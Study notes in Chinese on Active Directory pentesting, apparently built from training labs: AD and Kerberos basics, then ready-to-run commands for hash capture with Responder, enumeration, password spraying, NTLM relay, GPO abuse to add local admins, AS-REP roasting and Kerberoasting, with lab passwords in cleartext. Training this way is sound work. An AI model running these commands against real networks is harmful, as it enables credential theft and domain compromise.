>[!NOTE]
>AD常用的工具有PowerView、SharpHound、BloodHound、Impacket、Rubeus、mimikatz。
# AD 基礎知識
>[!NOTE]
>執行AD的列舉與攻擊之前需要的一些知識
## Active Directory Domain Service (AD DS)
>[!note]
>這個服務收藏所有Object，包含 users、groups、machines、shares
### Users
>[!warning]
>一種security principals，可以被授權存取某些資源的Object，比如說一個user可以被授權存取檔案或是印表機這樣的資源。

- People :  一般使用者帳號
- Services :  走 Kerberos的服務都需要一個users去執行(比如說 IIS或是 MSSQL)，理論上只會賦予需要的權限。
### Machines
>[!warning]
>另一種security principals，也是一種Object，當電腦加入一個Domain之後就會自動建立這台電腦的Machine Object，基本上可以說是那部電腦的Local Admin。

這Machine Object理論上會自動產生一組密碼，如果知道這組密碼還是可以登入的，在AD裡面這種Machine Object後面會加上`$`(`DC$`、`pcTHM$`)

>以下表格，統整AD 帳號的種類。

| 類型                                       | 例子                                        | 特點                                                                               |
| ---------------------------------------- | ----------------------------------------- | -------------------------------------------------------------------------------- |
| **電腦帳號 (Computer Account)**              | `MSSQLSvc/DB01.contoso.local` 綁定在 `DB01$` | 安裝 SQL Server、IIS 等時，如果沒特別指定服務帳號，預設就是用該機器帳號（`<hostname>$`）。KDC 用機器帳號的 key 來加密票證。 |
| **一般使用者帳號當作服務帳號**                        | `svc_sql`, `svc_iis`                      | 管理員手動創建，設定密碼，指定服務在這個帳號下跑。常見於舊式架構。                                                |
| **Managed Service Account (MSA)**        | `svc_sql$`                                | 微軟提供的服務帳號，密碼自動輪換。                                                                |
| **Group Managed Service Account (gMSA)** | `gmsa_web$`                               | 多台伺服器共用一個受管服務帳號，密碼由 AD 自動管理。                                                     |
### Security Groups
>[!warning]
>用於權限控管，加入這個全組就會有這個群組的權力。
>

```
net localgroup
net localgroup "Users"
```

| **Security Group** | **Description**                                           |
| ------------------ | --------------------------------------------------------- |
| Domain Admins      | 此群組的使用者在整個網域中擁有系統管理權限。預設情況下，他們可以管理網域內的任何電腦，包括網域控制站 (DCs)。 |
| Server Operators   | 此群組的使用者可以管理網域控制站 (Domain Controllers)，但無法變更任何系統管理群組的成員資格。 |
| Backup Operators   | 此群組的使用者可以不受檔案權限限制地存取任何檔案，通常用於在電腦上執行資料備份。                  |
| Account Operators  | 此群組的使用者可以在網域中建立或修改其他帳號。                                   |
| Domain Users       | 包含網域中所有現有的使用者帳號。                                          |
| Domain Computers   | 包含網域中所有現有的電腦。                                             |
| Domain Controllers | 包含網域中所有現有的網域控制站 (DCs)。                                    |
### Organizational Units (OUs)
>[!note]
>Object的Container，用於區分Objects，可以透過OUs派送 Policy

- 可以透過 "Active Directory Users and Computers"查看目前的OUs
- 有一些Builtin的OUs
	- Builtin : 包含任何 Windows 主機皆可使用的預設群組。
	- Computers : 任何加入網路的電腦預設都會放在這裡，如有需要可以將它們移動到其他位置。
	- Domain Controllers : 預設的組織單位 (OU)，其中包含網路中的網域控制站 (DCs)。
	- Users : 預設的使用者與群組，適用於整個網域層級。
	- Managed Service Accounts : 儲存由 Windows 網域內服務所使用的帳號。
>[!CAUTION]
>這邊的Groups跟**Organizational Units(OUs)**，是兩個不一樣的東西，不要搞錯。
>- OUs 非常適合用來將原則套用到使用者和電腦，這些原則包含針對企業中不同角色的使用者所需的特定設定。請記住，一個使用者在同一時間只能隸屬於一個 OU，因為對同一個使用者同時套用兩組不同的原則是沒有意義的。
>- Security Gorups 是用來授予對資源的存取權限。  
例如，如果你想讓某些使用者可以存取共用資料夾或網路印表機，就會使用群組來設定。  
一個使用者可以同時屬於多個群組，以便獲得多個資源的存取權限。
## Group Policy
>[!note]
>利用Organizational Units 把 Object分類後，可以利用Group Policy將設定套用在各OUs上面，

- 預設GPO分享的目錄是 `SYSVOL`，位於`C:\Windows\SYSVOL\sysvol\`
強制更新指令
```
gpupdate /force
```

## 什麼是 Kerberos
>[!NOTE]
>一種**網路身分驗證協定**，主要用於 Active Directory、企業網路，目的是在不傳送使用者密碼的情況下，安全地讓用戶與服務互相驗證身份，大部分需要用 Kerberos 認證的服務都必須對應到一個「安全主體 (security principal)」，所以只要那個服務要使用 Kerberos（像 MSSQL、IIS、SMB、LDAP），就一定要綁定到某個 principal。
### 核心角色
| 角色                                | 功能                                 |
| --------------------------------- | ---------------------------------- |
| **Client**                        | 使用者電腦或應用程式                         |
| **KDC (Key Distribution Center)** | 金鑰中心，跑在網域控制器 (Domain Controller) 上 |
| **AS (Authentication Service)**   | KDC 裡負責初次驗證的服務                     |
| **TGS (Ticket Granting Service)** | KDC 裡負責發服務票證的服務                    |
| **Service / Server**              | 提供資源的伺服器 (SMB、MSSQL、IIS…)          |
### Kerberos流程
1. AS-REQ (Client → KDC (AS)): 
	- 發送 **AS-REQ**，內容：
	- 使用者帳號（`username@REALM`）
	- 要求加密類型（RC4/AES 等）
	- 隨機數 / 時間戳 (用來防重放)
2. AS-REP (KDC → Client (AS-REP)):
	-  TGT (Ticket Granting Ticket)
	- Client/TGS Session Key (封在給 client 的回應裡)
3. TGS-REQ (Client → KDC (TGS)) :
	- TGT (整張 krbtgt 加密的票)
	- Authenticator：使用者用剛剛的 Session Key 加密的時間戳 (證明持票人就是該使用者)
	- 想要存取的服務名稱（SPN，例如 `MSSQLSvc/db.contoso.local`）
4. TGS-REP
	- **Service Ticket (TGS)**：內含使用者 SID、群組、Session Key、有效期，並用「目標服務帳號」的金鑰加密（只有那個服務解得開）
	- **Service Session Key (給 client)*
5. AP-REQ (Client → Service):
	-  TGS（服務票）
	- Authenticator：用 Service Session Key 加密的時間戳
6. AP-REP (Service → Client (AP-REP, optional)): 
	- 若雙方要雙向驗證，服務可回傳用 Service Session Key 加密的回應。
## Active Directory Trusts
>[!note]
>用於連結兩個 Active Directory domains 或是 Forests，讓Domain A的User可以存取Domain B的資源，有分成one-way trust relationship及 two-way trust relationship

>One-way Trust direction : 在單向信任關係中，信任方向是單向的，而不是雙向的。 在單向信任關係下，**網域 A 信任網域 B，但網域 B 並不信任網域 A**。 實際上，這表示網域 A 的使用者可以通過驗證來存取網域 B 的資源；然而，網域 B 的使用者則無法通過驗證來存取網域 A 的資源。(The direction of trust goes from Domain A to Domain B, and the directory of access goes from domain B to domain A.)

> Two-way Trust direction : 在雙向信任關係中，信任是雙向的，這表示兩個網域中的使用者都可以存取對方網域的資源。 例如，若網域 A 與網域 B 建立了雙向信任關係，代表網域 A 的使用者可以通過驗證來存取網域 B 的資源，而網域 B 的使用者也可以通過驗證來存取網域 A 的資源。

>Transitive and Non-transitive trusts : 



# 內網偵蒐
>[!WARNING]
>在進入內往後，可能需要先瞭解內網友甚麼東西，比如說主機發現，服務發現等等
- 主要目標
	- AD Users : 列舉有效的使用者以及password spraying
	- AD Joined Computers : Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc.
	- Key Services : Kerberos, NetBIOS, LDAP, DNS
	- Vulnerable Hosts and Services : 就漏洞、設定錯誤等等可以利用的方法
## 存活主機列舉手段
>[!WARNING]
>希望透過這些手段可以知道，可以知道這個網段裡面有哪些主機在運作

>[!NOTE]
>我們希望透過Layer2(ARP、mDNS)、Layer3(ping)的協定來鎖定內網友那些主機，並透過Namp掃描就可以分析出那臺是AD。
### Wireshark
```shell-session
sudo -E wireshark
```
### Tcpdump
```shell-session
sudo tcpdump -i ens224 
```
```
tcpdump -i eth0 icmp
```
### Responder
```bash
sudo responder -I ens224 -A 
```
### FPing Active Checks
```shell-session
fping -asgq 172.16.5.0/23
```
## 透過Responeder抓取NTLMv2 
如果有網路裡面有`\\print01.inlanefreight.local` ，但是有人打錯成`\\printer01.inlanefreight.local`，電腦會用`LLMNR/NBT-NS`去問整個網路哪裡有`\\printer01.inlanefreight.local`，我們就可以吃到NTLMv2的hash跟帳號。
### Linux版本
- responder
```bash
sudo responder -I ens224 
```
- hashcat
```shell-session
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
```
### Windows版本
-  Inveigh :  [點我下載](https://github.com/Kevin-Robertson/Inveigh)
> 這是一個powershell的工具，可以用來收LLMNR收LLMNR等東西，沒有再更新了
```powershell-session
Import-Module .\Inveigh.ps1
```
```powershell-session
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
- C# Inveigh (InveighZero)
```powershell-session
.\Inveigh.exe
```
# 列舉手法
>[!WARNING]
>用內建工具、第三方工具
## 基礎情蒐指令
* 檢查domain user
```
net user /domain
```
- 檢查用戶資訊
```
net user jeffadmin /domain
```
- 檢查domain群組
```
net group /domain
```
- 檢查群組資訊
```
net group "Sales Department" /domain
```
- 檢查AD資訊
``` powershell 
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```
## PowerView 基礎情蒐指令
[PowerView 下載點](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
* Domain 資訊
``` powershell
Get-NetDomain
```
- 列出domain user
``` powershell
Get-NetUser
```
- 出domain user特定資訊
``` powershell
Get-NetUser | select cn,pwdlastset,lastlogon
```
- 檢查群組資訊 
``` powershell
Get-NetGroup
```
- 檢查電腦資訊
``` powershell
Get-NetComputer | select operatingsystem,dnshostname
```
- 尋找目前的user在整個網域中有沒有有電腦有 administrative permissions
``` powershell
Find-LocalAdminAccess
```
- 檢查user有沒有在其他電腦登入過
``` powershell
Get-NetSession -ComputerName files04 -Verbose 
Get-NetSession -ComputerName web04 -Verbose
```
- 列舉出Server上的SPN
```
setspn -L iis_service
```
``` powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```
-  Domain User Information
```powershell-session
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```
-  Testing for Local Admin Access
```powershell-session
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```
## SharpView基礎情蒐指令
> .NET版本的powershell，指令幾乎都一樣
- 列舉特定使用者訊息
```powershell-session
.\SharpView.exe Get-DomainUser -Identity forend
```
## Snaffler
>Snaffleris a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories.
- [點我下載](https://github.com/SnaffCon/Snaffler)
```bash
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```




## 列舉密碼政策(Password Policy)
### crackmapexec 
```shell-session
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```
### rpcclient
```shell-session
rpcclient -U "" -N 172.16.5.5
```
```shell-session
rpcclient $> querydominfo
Domain:		INLANEFREIGHT
Server:		
Comment:	
Total Users:	3650
Total Groups:	0
Total Aliases:	37
Sequence No:	1
Force Logoff:	-1
Domain Server State:	0x1
Server Role:	RO
```
### enum4linux-ng
```shell-session
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```
### PowerView
```powershell-session
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy
```
## 使用者列舉
>[!WARNING]
>透過SMB Null Session跟LDAP Anonymous列舉
### 透過SMB NULL Session
- enum4linux
```shell-session
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
- rpcclient
```shell-session
rpcclient -U "" -N 172.16.5.5
```
```shell-session
rpcclient $> enumdomusers 
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]
```
- CrackMapExec
```shell-session
crackmapexec smb 172.16.5.5 --users
```
``` title:rid-brute
crackmapexec smb 192.168.152.172 -u guest -p "" --rid-brute
```
### Nmap掃描
> vincent 再discord補充
```
nmap -n -sV --script "ldap* and not brute" -p 389 192.168.163.187
```
```
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='access.offsec',userdb=names.txt 192.168.163.187
```
```
nmap -sV --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb='/usr/share/wordlist/userlist.txt' <target ip> -p88
```
### LDAP with cred
```
ldapsearch -x -H ldap://10.10.11.174 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
```
### LDAP Anonymous
-  ldapsearch
```shell-session
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```
```
ldapsearch -x -H ldap://10.10.10.175  -b "dc=Egotistical-bank,dc=local"
```
```
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```
```
ldapsearch -x -H ldap://192.168.212.122 -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b "dc=hutch,dc=offsec" "(ms-MCS-AdmPwd=*)"  ms-MCS-AdmPwd
```
- 可以做`|grep description ` 、`|grep sAMAccountName`
- ldapsearch 過濾手法 : 基於尋找特殊的設定
``` bash
cat ldapsearch.out | awk '{print $1}' | sort | uniq -c | sort -nr
```
- windapsearch.py 
[點我下載](https://github.com/ropnop/windapsearch)
```shell-session
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```
```
# Get computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
```
### 利用Kerbrute列舉使用者
>利用[Kerberos Pre-Authentication](https://ldapwiki.com/wiki/Wiki.jsp?page=Kerberos%20Pre-Authentication#top)來運作，速度會比較快
```
./kerbrute_linux_amd64 userenum --dc 10.10.207.146 -d THM-AD userlist.txt
```
```shell-session
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```
```
./kerbrute_linux_amd64 userenum --dc 192.168.1.100 -d domain.local names.txt
```
### 透過已知帳號
>利用已經獲得的帳號以及密碼，進去撈其他使用者資料的手法
```shell-session
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```
### 利用Impacket-Get-ADuser
```
impacket-GetADUsers -all -dc-ip 192.168.241.122 hutch.offsec/fmcsorley:CrabSharkJellyfish192
```
- 搭配uername.list也有列舉使用者的功能 
[連結](https://tools.thehacker.recipes/impacket/examples/getnpusers.py)
```
GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
```
## SPN列舉
>[!NOTE]
>假設一個server是user自己在跑的，那這個server就是user自己的user account defines the context，如果這個server是system自記跑的，那就是Service Account，一般來說，大型的Application會有使用Service Account，比如說Exchange Server、MsSQL，而這些Service Account的identifier就是Service Principal Name
- PowerView
```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```
- setspn.exe
```
setspn.exe -L iis_service
```


## Domain Share列舉
* PowerView 
``` powershell
Find-DomainShare
```
- PowerView
``` powershell
Find-DomainShare -CheckShareAccess
```
- 存取的方法
``` powershell
ls \\DC1.corp.com\SYSVOL\corp.com\Policies\oldpolicy\
```
## CrackMapExec利用
>[!WARNING]
>當取得一組帳號後，可以利用CrackMapExec做橫向擴散的手法。
>這邊假設是forend/Klmcargo2
### 確認主機內有的帳號
```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```
### 確認主機內有的群組
```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```
### 確認誰登入過
```shell-session
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```
### 查看share folder
```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```
### 查看folder內的所有資料夾(spider_plus)
```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```
### Dumping the LAPS Password with crackmapexec
```
crackmapexec ldap 192.168.219.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.219.122 -M laps
```
## SharpHound
>[!NOTE]
>2024/2/20更新: 根本不用打那麼多，打`.\SharpHound.exe`就可以了，打其他的反而輸出會跟人家不一樣。

> 版本要對到，不然就會輸出不了  
- Kali 裡面的位置
```
cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
```
- SharpHound.ps1蒐集資料的指令
```
. .\SharpHound.ps1
```
```
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
```
```
Invoke-BloodHound -CollectionMethod All
```
- SharpHound.exe 蒐集資料的指令 
```
.\SharpHound.exe --CollectionMethods All
```
###  BloodHound Raw Query
- query session to computer 
```
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```
- query to display all computers
```
MATCH (m:Computer) RETURN m
```
- query to display all users
```
MATCH (m:User) RETURN m
```
- delete all node 
```
match (a) -[r] -> () delete a, r
match (a) delete a
```
### BloodHound.py
>[!WARNING]
>用python檔直接在kali做sharphound的事情，不需要把sharphound檔案丟過去
- [吉哈伯連結](https://github.com/dirkjanm/BloodHound.py) 
```
/opt/BloodHound/bloodhound.py -d blackfield.local -u support -p '#00^BlackKnight' -g DC01.blackfield.local -c all -ns 10.10.10.192
```
```
/opt/BloodHound/bloodhound.py -d htb.local -u james -p 'J@m3s_P@ssW0rd!' -d htb.local -c all -ns 10.10.10.52
```
# AD的ACL利用
>[!NOTE]
> ACL是由很多ACE組成的，ACE設定錯誤可以讓使用者或是攻擊者拿到原本不屬於自己的權限，常見的有這三種
> - `ForceChangePassword`
> - `GenericAll`
> - `GenericWrite`

| GenericAll | Full permissions on object |
| ---- | ---- |
| GenericWrite | Edit certain attributes on the object |
| WriteOwner | Change ownership of the object |
| WriteDACL | Edit ACE's applied to object |
| ACE |  |
| AllExtendedRights | Change password, reset password, etc. |
| ForceChangePassword | Password change for object |
| Self (Self-Membership) | Add ourselves to for example a group |
## ACE的列舉手法
>[!WARNING]
>這章利用PowerView作為主要列舉工具
### 利用PowerView列舉單一使用者
>假設我們已經拿到一個使用者`wley`
- Get-DomainObjectACL
```powershell-session
$sid = Convert-NameToSid wley(替換成要列舉的username)
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
- 用-ResolveGUIDs把GUID轉成人看得懂的東西
```powershell-session
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```
- 列舉特定用戶的ACL
``` powershell
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
```
### 利用Get-ADUser列舉
>這邊想定是PowerView被封鎖，而Get-ADUser是Windows官方的工具，所以可以直接拿來用應該不會被怎樣
- 製作用戶清單
```powershell-session
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```
- 透過Get-ADUser列舉
```powershell-session
PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```
- 列出群組成員ACL
``` powershell
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```
- sid轉換成name
``` powershell
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
```
## ACE攻擊戰術
>[!NOTE]
>這章有夠難先戰術性跳過

# 攻擊手法
## Password Spraying
>[!WARNING]
>精神在於透過已知的單一密碼，去找到所屬的帳號。
### rpcclient
> valid_users.txt 可以用enum4linux等等工具產出
```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
### Spray-Passwords.ps1
```
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```
### crackmapexec
- Password Spraying with crackmapexec
```
crackmapexec smb 192.168.240.75 -u user.txt -p 'Nexus123!' -d corp.com --continue-on-success
```
-  Local Admin with hash
```shell-session
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
### kerbrute_windows_amd64.exe
```
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
### DomainPasswordSpray
>這個東西會自動透過AD建立使用者名單，自動真測密碼，如果加入`-UserList`可以加入自製的wordlist
```powershell-session
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
## NTLM Relay Attack
>[!NOTE]
>需要搭配社教工程手法，要受害者點擊到攻擊者的server(各種方法，不一定是http)才可以記錄到ntlm v2
### 利用LDAP
>[!NOTE]
>取得Ldap可以修改GPO的權限
- Ldap ntlm relay attack
``` bash
sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.x --http-port '80,8080' -i --no-smb-server
```
``` bash
nc 127.0.0.1 11000
```
- LDAP Shell Command : provide the studentx user, WriteDACL permissions over Devops Policy
```
write_gpo_dacl studentx {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```
- Alternatively
```
add_computer stdx-gpattack Secretpass@123
write_gpo_dacl stdx-gpattack$ {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```
## GPO Abuse
>[!NOTE]
>需要建立在有對 GPO 的寫入權上面，把惡意命令透過 GPO 部署到網域主機上，其實原理是寫假的GPO檔案，透過file share讓 AD抓，再派送下去。
- GPOddity : https://github.com/synacktiv/GPOddity
``` bash
sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'student827' --password 'WzeC58hNKMjQdqpR' --command 'net localgroup administrators studentx /add' --rogue-smbserver-ip '172.16.100.27' --rogue-smbserver-share 'stdx-gp' --dc-ip '172.16.2.1' --smb-mode none
```
- `sudo python3 gpoddity.py`: 以 root 權限執行 GPOddity 的 Python 腳本（需要相應權限與環境）。
- `--gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147'` : 要操作的 **GPO 的 GUID**（要修改哪個 Group Policy Object）。GPOddity 會嘗試對該 GPO 寫入或注入惡意內容。
- `--domain 'dollarcorp.moneycorp.local'`: 目標 AD 網域名稱（用來定位 DC、組織單位與 GPO 路徑等）。
- `--username 'studentx' --password 'gG38Ngqym2DpitXuGrsJ'` :用來執行操作的帳號／密碼。GPOddity 會用這個身分嘗試對 GPO 做修改——若該帳號在 GPO 的 ACL 上具有 write 權限（或能透過 relay/其他方式取得足夠權限），則可成功修改 GPO。
- `--command 'net localgroup administrators studentx /add'`: 要放進 GPO（例如 startup script、scheduled task 或其它可執行载入點）的**命令**。目的是在受 GPO 影響的主機上執行該命令，將 `studentx` 加入本機 Administrators。
- `--rogue-smbserver-ip '172.16.100.x' --rogue-smbserver-share 'stdx-gp'` : **惡意/rogue SMB 伺服器位址與分享名稱**。GPOddity 會把某些 GPO 檔案或 payload 指向這個 UNC 路徑（例如 `\\172.16.100.x\stdx-gp\...`），或在攻擊流程中以此作為 payload-host。這常在 GPO/Group Policy 文件被建立或引用時被利用。
- `--dc-ip '172.16.2.1'`: 指定要對哪台 **Domain Controller (DC)** 發出 LDAP/SMB 等操作（即目標 DC 的 IP）。GPO 的修改最後要寫入到 DC 上的 Sysvol/AD 物件，通常會指向 DC。
- `--smb-mode none`  : 指示 GPOddity **不要在本機啟動 SMB server**（也就是不在本地提供 rogue SMB；你可能已經有另一個 SMB host 可用，或不想開本地 SMB listener）。（工具參數在 repo activity/README 有說明）。

因為smbserver開再 stdx-gp，所以要設定file share
``` bash
mkdir /mnt/c/AD/Tools/stdx-gp
cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/stdx-gp
```
``` bash
net share stdx-gp=C:\AD\Tools\stdx-gp /grant:Everyone,Full
icacls "C:\AD\Tools\stdx-gp" /grant Everyone:F /T
```
## AS-REP Roasting
- impacket-GetNPUsers
``` bash
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
```
- impacket-GetNPUsers(不用密碼)
```
impacket-GetNPUsers -no-pass -usersfile real_user.txt -dc-ip 10.10.207.146 THM-AD/
```
- Rubeus
```
.\Rubeus.exe asreproast /nowrap
```
- PowerView
```
Get-DomainUser -PreauthNotRequired
```
- hashcat -- 用於爆破產出的密碼
```
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
## Kerberoasting
>[!NOTE]
>1. Kerberos 的運作
>	- 在 AD 中，每個服務 (像 SQL、IIS、Exchange) 通常有個「服務帳號」(Service Account)，它的 SPN（Service Principal Name）會在 AD 註冊。
>	- 使用者要連線服務時，向 KDC (Key Distribution Center) 請求一張 服務票證 (TGS, Ticket Granting Service ticket)，這張票證是用「服務帳號的 NTLM hash」加密的。
>2. Kerberoasting 的想法
>	- 任何網域使用者都可以去要別的服務的 TGS（因為 AD 預設允許）。
>	- 拿到 TGS 後，票證裡面那段是用服務帳號的密碼雜湊加密的。
>	- 攻擊者把這段加密資料抓下來，離線爆破 (brute force / dictionary / GPU crack)，破解出服務帳號的明文密碼。
>3. 結論: ** 一個普通域使用者，去請求服務票證 (TGS)，把裡面用服務帳號 hash 加密的資料拿回來，離線爆破以取得服務帳號密碼。**

>[!WARNING]
>實施Kerberoasting的前提是有以下其中一點
>- domain user credentials (cleartext or just an NTLM hash)
>- SYSTEM account 
>- shell in the context of a domain user

>[!NOTE]
>Kerberoasting主要攻擊SPN account(SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running)
### 利用PowerView列舉SPN資訊
- 導入powerview
```powershell-session
Import-Module .\PowerView.ps1
```
- 列舉SPN account
```powershell-session
Get-DomainUser * -spn | select samaccountname
```
- 列舉特定SPN account的資訊
```powershell-session
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
```powershell-session
SamAccountName       : sqldev
DistinguishedName    : CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433*$BF9729001
                       376B63C5CAC933493C58CE7$4029DBBA2566AB4748EDB609CA47A6E7F6E0C10AF50B02D10A6F92349DDE3336018DE177AB4FF3CE724FB0809CDA9E30703EDDE93706891BCF094FE64387B8A32771C7653D5CFB7A70DE0E45FF7ED6014B5F769FDC690870416F3866A9912F7374AE1913D83C14AB51E74F200754C011BD11932464BEDA7F1841CCCE6873EBF0EC5215C0
......
```
### mimikatz 
>利用mimikatz抓取memory抓取裡面殘存的TGS
- 撈取指令
```cmd-session
base64 /out:true
mimikatz # kerberos::list /export
```
- 輸出成base64格式，有利於利用複製貼上到kali做破解，
```shell-session
 echo "doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMII......." |  tr -d \\n 
```
```shell-session
 cat encoded_file | base64 -d > sqldev.kirbi
```
- 透過kirbi2john解析出TGS，可以把輸出存在crack_file檔案裡面(自己建立)
```shell-session
python2.7 kirbi2john.py sqldev.kirbi
```
[kirbi2john.py](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py)
- 透過指令把格式修改成hashcat可以吃
```shell-session
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
### impacket-GetUserSPNs
- 用 GetUserSPNs列舉使用者資訊
```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```
```shell-session
Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>               
sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain
....
```
- 用GetUserSPNs抓取所有SPN的TGS ticket
```
sudo impacket-GetUserSPNs -request -dc-ip 192.168.187.70 corp.com/pete
```
- 用GetUserSPNs抓取單一SPN的TGS ticket
```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```
- 用GetUserSPNs tested for a quick No-Preauth kerberos win without supplying a username
```
GetNPUsers.py cascade.local/ -dc-ip 10.10.10.182
```
### Rubeus
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
### hashcat -- 用於爆破產出的密碼
```
sudo hashcat -m 13100 kerberos.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
## Silver Tickets
>[!NOTE]
